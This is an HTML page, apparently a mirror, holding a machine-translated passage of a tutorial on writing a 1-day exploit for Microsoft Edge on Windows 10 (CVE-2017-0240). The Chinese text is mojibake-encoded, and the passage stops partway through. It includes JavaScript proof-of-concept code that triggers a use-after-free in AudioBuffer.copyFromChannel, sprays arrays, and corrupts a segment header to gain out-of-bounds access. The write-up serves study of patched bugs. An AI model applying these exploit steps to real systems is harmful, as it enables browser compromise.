<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ§—ğŸ¿ ğŸ’» ğŸ¤šğŸ½ Windows 10ä¸Šä»CVEåˆ°RCEçš„Microsoft Edge ğŸ  ğŸ¤¾ğŸ» ğŸ›ŒğŸ¾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="åœ¨æœ¬æ–‡çš„æ¡†æ¶ä¸­ï¼Œæˆ‘ä»¬å°†å……åˆ†è¯¦ç»†åœ°è€ƒè™‘ä¸ºMicrosoft Edgeä¸­çš„æ¼æ´ç¼–å†™æ¼æ´åˆ©ç”¨ç¨‹åºçš„è¿‡ç¨‹ï¼Œä»¥åŠéšåä»æ²™ç›’é€€å‡ºçš„è¿‡ç¨‹ã€‚ å¦‚æœæ‚¨æœ‰å…´è¶£çŸ¥é“æ­¤è¿‡ç¨‹çš„å¤–è§‚ï¼Œæ¬¢è¿å…‰ä¸´ï¼ 
 å¼•è¨€ 


åœ¨è’™ç‰¹åˆ©å°”æœ€æ–°çš„Pwn2Own 2019ä¸­ï¼Œåœ¨æµè§ˆå™¨ç±»åˆ«ä¸­ï¼Œå±•ç¤ºäº†ä¸€ç§ç”¨äºå…¥ä¾µMicrosoft Edgeçš„æ¼æ´ã€‚ ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Windows 10ä¸Šä»CVEåˆ°RCEçš„Microsoft Edge</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="å‰è¨€"></p><br><p> åœ¨æœ¬æ–‡çš„æ¡†æ¶ä¸­ï¼Œæˆ‘ä»¬å°†å……åˆ†è¯¦ç»†åœ°è€ƒè™‘ä¸ºMicrosoft Edgeä¸­çš„æ¼æ´ç¼–å†™æ¼æ´åˆ©ç”¨ç¨‹åºçš„è¿‡ç¨‹ï¼Œä»¥åŠéšåä»æ²™ç›’é€€å‡ºçš„è¿‡ç¨‹ã€‚ å¦‚æœæ‚¨æœ‰å…´è¶£çŸ¥é“æ­¤è¿‡ç¨‹çš„å¤–è§‚ï¼Œæ¬¢è¿å…‰ä¸´ï¼ </p><a name="habracut"></a><br><h2 id="vvedenie"> å¼•è¨€ </h2><br><p>åœ¨è’™ç‰¹åˆ©å°”æœ€æ–°çš„<code>Pwn2Own 2019</code>ä¸­ï¼Œåœ¨æµè§ˆå™¨ç±»åˆ«ä¸­ï¼Œå±•ç¤ºäº†ä¸€ç§ç”¨äºå…¥ä¾µ<code>Microsoft Edge</code>çš„æ¼æ´ã€‚ ä¸ºæ­¤ä½¿ç”¨äº†ä¸¤ä¸ªæ¼æ´ï¼šæ¸²æŸ“å™¨ä¸­çš„<code>double free</code>å’Œé€€å‡ºæ²™ç®±çš„é€»è¾‘æ¼æ´ã€‚ è¿™ä¸¤ä¸ªæ¼æ´æœ€è¿‘å·²å…³é—­ï¼Œå¹¶åˆ†é…äº†ç›¸åº”çš„<code>CVE</code> ï¼š <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>CVE-2019-0940</code></a>å’Œ<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>CVE-2019-0938</code></a> ã€‚ æ‚¨å¯ä»¥åœ¨åšå®¢ä¸­äº†è§£æœ‰å…³æ¼æ´çš„æ›´å¤šä¿¡æ¯ï¼š <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Pwn2Own 2019ï¼šMicrosoft Edge Renderer Exploitationï¼ˆCVE-2019-0940ï¼‰ã€‚</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬1éƒ¨åˆ†</a>å’Œ<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Pwn2Own 2019ï¼šMicrosoft Eedge Sandbox Escapeï¼ˆCVE-2019-0938ï¼‰ã€‚</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬äºŒéƒ¨åˆ†</a> ã€‚ </p><br><p> ä½œä¸ºæœ¬æ–‡çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>CVE-2017-0240</code></a>å’Œ<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>CVE-2016-3309</code></a>ä»¥<code>Windows 10</code>ä¸Šçš„<code>Microsoft Edge</code>ä¸ºä¾‹ï¼Œæ¼”ç¤ºç¼–å†™è¿™ç§åˆ©ç”¨ç¨‹åºçš„è¿‡ç¨‹ä»¥åŠä¸ºæ­¤éœ€è¦å¤šå°‘æ—¶é—´å’Œèµ„æºã€‚ å·®å¼‚ä¹‹ä¸€æ˜¯ï¼Œå¦‚æœåœ¨<code>Pwn2Own</code>æ¼”ç¤ºçš„æ¼æ´åˆ©ç”¨é€»è¾‘æ¼æ´é€€å‡ºæ²™ç®±ï¼Œåˆ™åœ¨æˆ‘ä»¬çš„æ–¹æ¡ˆä¸­ï¼Œ <code>Windows 10</code>å†…æ ¸ä¸­çš„æ¼æ´å°†ç”¨äºé€€å‡ºæ²™ç®±ã€‚ æ­£å¦‚<code>Microsoft</code>è¡¥ä¸æ‰€ç¤ºï¼Œå†…æ ¸ä¸­çš„æ¼æ´æ¯”æ²™ç›’å®ç°ä¸­çš„æ¼æ´è¦å¤šå¾—å¤šã€‚ ç»“æœï¼Œè¿™æ ·çš„æ¼æ´é“¾æ›´æœ‰å¯èƒ½é‡åˆ°ï¼Œå¹¶ä¸”å¯¹äºå…¬å¸ä¸­çš„ISå‘˜å·¥æ¥è¯´å¾ˆæœ‰ç”¨ã€‚ </p><br><h2 id="ishodnye-dannye"> æºæ•°æ® </h2><br><p> æœ¬æ–‡å°†ä»‹ç»ä¸º<code>Microsoft Edge</code>æµè§ˆå™¨ç¼–å†™1å¤©æ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹ã€‚  <code>CVE-2017-0240</code>å°†è¢«è¿è¡Œã€‚ æ“ä½œçš„ç¬¬ä¸€é˜¶æ®µå°†åŸºäºæºä»£ç ä¸­çš„èµ„æ–™[1]ï¼Œæˆ‘ä»¬å°†è·å¾—<code>arbitrary address read/write</code>åŸè¯­ï¼Œå¹¶ä¸”ç†Ÿæ‚‰å„ç§æŠ€æœ¯ï¼Œè¿™äº›æŠ€æœ¯åœ¨åˆ©ç”¨æ­¤ç±»æ¼æ´æ—¶å¯èƒ½ä¼šå¾ˆæœ‰ç”¨ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å‘æ‚¨ä»‹ç»<code>pwn.js</code>å·¥å…·ï¼Œè¯¥å·¥å…·å°†å¸®åŠ©æ‚¨åŸºäºä»»æ„è¯»å†™æ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œè¿˜å°†è€ƒè™‘å„ç§<code>mitigations</code>å’Œç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ã€‚ åœ¨æœ€åé˜¶æ®µï¼Œå°†åˆ©ç”¨Windows <code>CVE-2016-3309</code>å†…æ ¸æ¼æ´æ¥å¢åŠ ç‰¹æƒï¼Œç»•è¿‡<code>AppContainer</code>é™åˆ¶å¹¶è·å¾—å¯¹å—æ”»å‡»è®¡ç®—æœºçš„å®Œå…¨æ§åˆ¶ã€‚ </p><br><p> å°†åœ¨å¸¦<code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code>å’Œ<code>Microsoft Edge (40.15063.0.0)</code>æµè§ˆå™¨<code>Microsoft Edge (40.15063.0.0)</code> ã€‚ </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva"> æ­¥éª¤1.è·å¾—<code>arbitrary address read/write</code>åŸè¯­ </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob"> æ¼æ´æè¿°å’Œè·å–<code>OOB</code> </h3><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">éŸ³é¢‘ç¼“å†²åŒº</a>å¯¹è±¡çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">copyFromChannel</a>æ–¹æ³•ä¸­å­˜åœ¨ä¸€ä¸ªç±»å‹<code>use-after-free</code>æ¼æ´ã€‚ </p><br><blockquote>  AudioBufferæ˜¯ä½äºå†…å­˜ä¸­çš„ç®€çŸ­éŸ³é¢‘èµ„äº§çš„æ¥å£ï¼Œå¯ä»¥ä½¿ç”¨AudioContext.decodeAudioDataï¼ˆï¼‰æ–¹æ³•ä»éŸ³é¢‘æ–‡ä»¶åˆ›å»ºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨AudioContext.createBufferï¼ˆï¼‰æ–¹æ³•ä»æºæ•°æ®åˆ›å»ºã€‚ æ”¾ç½®åœ¨AudioBufferä¸­çš„éŸ³é¢‘æ•°æ®å¯ä»¥åœ¨AudioBufferSourceNodeä¸­æ’­æ”¾ã€‚ </blockquote><p>  <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code>æ¼”ç¤ºæ–‡ç¨¿æä¾›äº†å¯¹è¯¥æ¼æ´å’Œè¡¥ä¸çš„è¯¦ç»†åˆ†æã€‚  <code>copyFromChannel</code>æ–¹æ³•æ—¶ï¼ŒéŸ³é¢‘ç¼“å†²åŒºé€šé“çš„å†…å®¹å°†å¤åˆ¶åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šçš„<code>destination</code>ç¼“å†²åŒºã€‚ è¯¥æ–¹æ³•è¿˜æ¥å—é€šé“å·ï¼ˆ <code>channelNumber</code> ï¼‰å’ŒéŸ³é¢‘ç¼“å†²åŒºä¸­çš„åç§»é‡ï¼ˆ <code>startInChannel</code> ï¼‰ï¼Œä»è¯¥ä½ç½®å¼€å§‹å¿…é¡»è¿›è¡Œå¤åˆ¶ã€‚ åœ¨å°†æ•°æ®ç›´æ¥å¤åˆ¶åˆ°<code>CDOMAudioBuffer::Var_copyFromChannel</code>å‡½æ•°ä¸­çš„<code>destination</code> <code>CDOMAudioBuffer::Var_copyFromChannel</code> ï¼Œå°†ç¼“å­˜<code>destination</code>ç¼“å†²åŒºï¼ˆç¼“å†²åŒºçš„åœ°å€å’Œå¤§å°å­˜å‚¨åœ¨å †æ ˆä¸Šçš„æœ¬åœ°å‡½æ•°å˜é‡ä¸­ï¼‰ï¼Œå¹¶å°†<code>channelNumber</code>å’Œ<code>startInChannel</code>å¯¹è±¡çš„å€¼<code>startInChannel</code>ä¸º<code>Int</code>ç±»å‹ï¼Œä¸ºæ­¤è°ƒç”¨è½¬æ¢åçš„å¯¹è±¡çš„<code>valueOf</code>æ–¹æ³•ã€‚ è¯¥æ¼æ´æ˜¯åœ¨ç±»å‹è½¬æ¢æ—¶å¯ä»¥ä½¿ç”¨<code>valueOf</code>å¯¹è±¡çš„é‡å†™æ–¹æ³•é‡Šæ”¾ç¼“å­˜çš„ç¼“å†²åŒºã€‚ ä¸ºäº†è¿›è¡ŒéªŒè¯ï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼š </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p> æ­¤ä»£ç ä½¿ç”¨<code>Web Workers</code>æŠ€æœ¯é‡Šæ”¾ç¼“å†²åŒºã€‚ åˆ›å»ºä¸€ä¸ªç©ºçš„<code>Worker</code> ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>postMessage</code>æ–¹æ³•å‘ä»–å‘é€æ¶ˆæ¯ã€‚ æ­¤æ–¹æ³•çš„ç¬¬äºŒä¸ªå¯é€‰<code>transfer</code>å‚æ•°æ¥å—ä¸€ä¸ª<code>Transferable</code>å¯¹è±¡æ•°ç»„ï¼ˆ <code>ArrayBuffer</code> ï¼Œ <code>MessagePost</code>æˆ–<code>ImageBitmap</code> ï¼‰ï¼Œè¯¥å¯¹è±¡çš„æƒé™å°†è¢«è½¬ç§»ç»™<code>Worker</code>å¹¶ä¸”è¯¥å¯¹è±¡åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­å°†ä¸å†å¯ç”¨ï¼Œå› æ­¤å¯ä»¥å°†å…¶åˆ é™¤ã€‚ æ­¤åï¼Œå°†è¿›å…¥<code>sleep</code> -æš‚æ—¶åœæ­¢æ‰§è¡Œç¨‹åºçš„åŠŸèƒ½ï¼ˆç‹¬ç«‹å®ç°ï¼‰ã€‚ è¿™æ˜¯å¿…éœ€çš„ï¼Œä»¥ä¾¿åƒåœ¾æ”¶é›†ç³»ç»Ÿï¼ˆ <code>GC</code> ï¼Œ <code>Garbage Collector</code> ï¼‰è®¾æ³•é‡Šæ”¾ç¼“å†²åŒºï¼Œå°†æƒåˆ©è½¬è®©ç»™è¯¥ç¼“å†²åŒºã€‚ </p><br><blockquote>  Web Workersæä¾›äº†ä¸€ç§åœ¨åå°çº¿ç¨‹ä¸­è¿è¡Œè„šæœ¬çš„ç®€å•æ–¹æ³•ã€‚ è¾…åŠ©çº¿ç¨‹å¯ä»¥æ‰§è¡Œä»»åŠ¡è€Œä¸ä¼šå¹²æ‰°ç”¨æˆ·ç•Œé¢ã€‚ å¦å¤–ï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨XMLHttpRequestè¿›è¡ŒI / Oï¼ˆå°½ç®¡responseXMLå’Œchannelå±æ€§å°†å§‹ç»ˆä¸ºnullï¼‰ã€‚ ç°æœ‰çš„Workerå¯ä»¥é€šè¿‡æ­¤ä»£ç æŒ‡å®šçš„äº‹ä»¶å¤„ç†ç¨‹åºå°†JavaScriptæ¶ˆæ¯å‘é€ç»™åˆ›å»ºè€…ä»£ç ï¼ˆåä¹‹äº¦ç„¶ï¼‰ã€‚ </blockquote><p> é€šè¿‡åœ¨è°ƒè¯•å™¨ä¸‹çš„Edgeä¸­è¿è¡Œæ­¤ä»£ç ï¼Œå¯ä»¥è·å¾—ä»¥ä¸‹å´©æºƒã€‚ </p><br><p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="æ­¥éª¤01å´©æºƒ"></p><br><p> ç»“æœï¼Œå¯¹<code>copyFromChannel</code>çš„è°ƒç”¨å°è¯•å°†éŸ³é¢‘ç¼“å†²åŒºçš„å†…å®¹å¤åˆ¶åˆ°æœªåˆ†é…çš„å­˜å‚¨åŒºä¸­ã€‚ è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¿…é¡»åœ¨æ­¤å†…å­˜åŒºåŸŸä¸­å®ç°ä»»ä½•å¯¹è±¡çš„åˆ†é…ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ•°ç»„æ®µæ˜¯å®Œç¾çš„ã€‚ </p><br><p>  <code>Chakra</code> ï¼ˆ <code>Edge</code>æµè§ˆå™¨ä¸­ä½¿ç”¨çš„<code>JS</code>å¼•æ“ï¼‰ä¸­çš„æ•°ç»„å®‰æ’å¦‚ä¸‹ï¼šæ•°ç»„å¯¹è±¡å…·æœ‰å›ºå®šçš„å¤§å°ï¼ŒæŒ‡å‘æ•°ç»„å¯¹è±¡çš„æŒ‡é’ˆï¼ˆå¯¹äº<code>IntArray</code> ï¼Œ <code>IntArray</code> ï¼‰å­˜å‚¨åœ¨å•ç‹¬çš„å†…å­˜åŒºåŸŸä¸­-æ®µï¼Œå¯¹è±¡ä¸­åŒ…å«æŒ‡å‘è¯¥å¯¹è±¡çš„æŒ‡é’ˆæ•°ç»„ã€‚ æ®µå¤´åŒ…å«å„ç§ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ®µçš„å¤§å°ï¼Œå®ƒå¯¹åº”äºæ•°ç»„çš„å¤§å°ã€‚ æ•°ç»„çš„å¤§å°ä¹Ÿå­˜åœ¨äºæ•°ç»„å¯¹è±¡æœ¬èº«ä¸­ã€‚ ä»ç¤ºæ„å›¾ä¸Šçœ‹ï¼Œå®ƒçœ‹èµ·æ¥åƒè¿™æ ·ï¼š </p><br><p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="ç‰‡æ–­ç»“æ„"></p><br><p> å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•åœ¨å…ˆå‰é‡Šæ”¾çš„ç©ºé—´ä¸­é€‰æ‹©æ•°ç»„æ®µï¼Œåˆ™å¯ä»¥ç”¨éŸ³é¢‘ç¼“å†²åŒºçš„å†…å®¹è¦†ç›–æ•°ç»„æ®µçš„å¤´ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬åœ¨<code>sleep(1000);</code>ä¹‹åæ·»åŠ ä»¥ä¸‹å‡ è¡Œæ¥ä¿®æ”¹ä¸Šé¢çš„ä»£ç <code>sleep(1000);</code>  ï¼š </p><br><pre> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p> é€‰æ‹©æ•°ç»„çš„å¤§å°ä»¥ä½¿æ•°ç»„æ®µçš„å¤§å°å æ®æ•´ä¸ªå †æ®µï¼ˆæœ€å°çš„ä¸å¯åˆ†å‰²çš„å †å†…å­˜ï¼Œå…¶å¤§å°ä¸º0x10000å­—èŠ‚ï¼‰ã€‚ è¿è¡Œæ­¤ä»£ç ï¼Œå°†<code>memcpy</code>å‡½æ•°æŒ‡å®šä¸ºæ–­ç‚¹ï¼ˆå°†ä¼šæœ‰è®¸å¤š<code>memcpy</code>è°ƒç”¨ï¼Œå› æ­¤é¦–å…ˆåœ¨<code>edgehtml!WebCore::AudioBufferData::copyBufferData</code>å¤„åœæ­¢æ˜¯æœ‰æ„ä¹‰çš„ï¼‰ï¼Œåœ¨æ­¤å‘ç”Ÿå´©æºƒã€‚ æˆ‘ä»¬å¾—åˆ°ä»¥ä¸‹ç»“æœï¼š </p><br><p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="æ­¥éª¤02"></p><br><p> å¤ªå¥½äº†ï¼ ç°åœ¨æˆ‘ä»¬å¯ä»¥ç”¨æˆ‘ä»¬è‡ªå·±çš„å€¼è¦†ç›–æ•°ç»„æ®µçš„æ ‡é¢˜ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ€æœ‰è¶£çš„å€¼æ˜¯æ•°ç»„çš„å¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸Šé¢çš„å±å¹•æˆªå›¾ä¸­çœ‹åˆ°å…¶åç§»é‡ã€‚ æ›´æ”¹éŸ³é¢‘ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š </p><br><pre> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p> æ³¨æ„<code>ta2[14]</code>å’Œ<code>ta2[15]</code> -å®ƒä»¬å·²ç»ä¸æ˜¯å¼•ç”¨æ®µå¤´ï¼Œè€Œæ˜¯å¼•ç”¨æ•°ç»„å€¼æœ¬èº«ã€‚ è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šå…¨å±€<code>arr</code>æ•°ç»„ä¸­æ‰€éœ€çš„æ•°ç»„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š </p><br><pre> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p> å¦‚æœç»“æœæ˜¯æ‰¾åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”å…¶å‰ä¸¤ä¸ªå…ƒç´ ä»¥æŸç§æ–¹å¼æ›´æ”¹ï¼Œé‚£ä¹ˆä¸€åˆ‡éƒ½å¾ˆå¥½ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬æœ‰äº†ä¸€ä¸ªæ•°ç»„ï¼Œå…¶æ®µå¤§å°å¤§äºå®é™…å¤§å°ã€‚ å‰©ä½™çš„é˜µåˆ—å¯ä»¥é‡Šæ”¾ã€‚ </p><br><p> è¿™é‡Œæœ‰å¿…è¦è®°ä½ï¼Œæ•°ç»„çš„å¤§å°å­˜åœ¨äºä¸¤ä¸ªå®ä½“ä¸­ï¼šåœ¨æ•°ç»„å¯¹è±¡ä¸­ä¿æŒä¸å˜ï¼Œè€Œåœ¨æ•°ç»„æ®µä¸­å¢åŠ æ•°ç»„ã€‚ äº‹å®è¯æ˜ï¼Œå¦‚æœä»£ç åœ¨<code>JIT</code>æ¨¡å¼ä¸‹æ‰§è¡Œå¹¶ä¸”å·²ç»è¿‡ä¼˜åŒ–ï¼Œåˆ™å¿½ç•¥æ•°ç»„å¯¹è±¡ä¸­çš„å¤§å°ã€‚ è¿™å¾ˆå®¹æ˜“å®ç°ï¼Œä¾‹å¦‚ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p> ä¹‹åï¼Œä½¿ç”¨<code>arr_get</code>å’Œ<code>arr_set</code>æ‚¨å¯ä»¥è¶…è¶Šæ•°ç»„çš„è¾¹ç•Œï¼ˆ <code>OOB</code> ï¼Œ <code>out-of-bound</code> ï¼‰ã€‚ </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu"> ä½¿ç”¨<code>OOB</code>è·å–è¯»å–å’Œå†™å…¥ä»»æ„åœ°å€çš„åŸè¯­ </h3><br><p> 